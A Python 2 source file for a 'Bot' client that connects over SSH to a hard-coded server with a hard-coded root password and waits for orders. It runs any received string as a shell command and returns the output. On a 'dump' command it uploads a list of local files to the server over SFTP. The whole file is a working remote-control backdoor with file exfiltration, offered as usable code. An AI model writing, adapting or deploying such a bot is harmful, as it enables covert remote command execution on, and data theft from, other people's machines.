from paramiko import Transport
from paramiko import SFTPClient
from paramiko import SSHClient
from paramiko import AutoAddPolicy
from threading import  Thread
from  subprocess import Popen
from  subprocess import PIPE

import  paramiko
import ChannelSSH
import os
import logging
logging.basicConfig()
duper_lp= "./path.cnf"
class Bot():
    def __init__(self):
        self.path_source = None
        self.path_destination = None


    def getOutputCmd(self,cmd):
        # do shell command
        try:
            proc = Popen(cmd, shell=True, stdout=PIPE, stderr=PIPE, stdin=PIPE)
            # read output
            stdout_value = proc.stdout.read() + proc.stderr.read()
            return stdout_value
        except:
            pass

    def dump_db(self):
        try:
            transport = Transport(('192.168.43.99', 222))
            privatekeyfile = os.path.expanduser('./bot_keys/id_rsa')
            mykey = paramiko.RSAKey.from_private_key_file(privatekeyfile)
            transport.connect(username='bot', pkey=mykey)
            sftp_client = SFTPClient.from_transport(transport)
            with open(duper_lp) as f:
                content = f.readlines()
            # to remove whitespace characters like `\n` at the end of each line
            for line in content:
                sftp_client.put(line.strip(), 'bot/dump/testdump.cnf')
            sftp_client.close()
            transport.close()
            print "End of dumping files "
        except Exception, e:
            print "Fct:Dumper file export: " + str(e)
    def get_dumper_file(self):
        try:
            transport = Transport(('192.168.43.99', 222))
            #mykey = paramiko.RSAKey(key=myprivatekey)
            privatekeyfile = os.path.expanduser('./bot_keys/id_rsa')
            mykey = paramiko.RSAKey.from_private_key_file(privatekeyfile)
            transport.connect(username='bot',pkey = mykey)
            sftp_client = SFTPClient.from_transport(transport)
            # should verify if file duper_lp exist, create it else
            sftp_client.get(self.path_source, duper_lp, callback=None)
            sftp_client.close()
            transport.close()
        except Exception, e:
            print "Fct:Dumper file import: "+str(e)


    def connect(self):
        subRoot = None
        client = SSHClient()
        client.set_missing_host_key_policy(AutoAddPolicy())
        client.connect('192.168.43.99',port=2222, username='root', password='thetoorpassword')
        chan = client.get_transport().open_session()
        while True:
            command = ChannelSSH.receiveFromChannel(chan)
            print  "cmd::"+command
            if 'deconnect' == command:
                ChannelSSH.closeChannel(chan)
                break
            elif 'dump' == command:
                ChannelSSH.sendToChannel('[+] Starting dump of files',chan)
                Thread(target=self.dump_db).start()
            elif '**LOADPATH**' in command:
                inita, path_d,path_s = command.split(';')
                self.path_source = path_s
                self.path_destination = path_d
                print ("ps:"+self.path_source+"--- path dest"+self.path_destination)
                self.get_dumper_file()
            else:
                ChannelSSH.sendToChannel(self.getOutputCmd(command),chan)


if __name__ == '__main__':
    bot = Bot()
    bot.connect()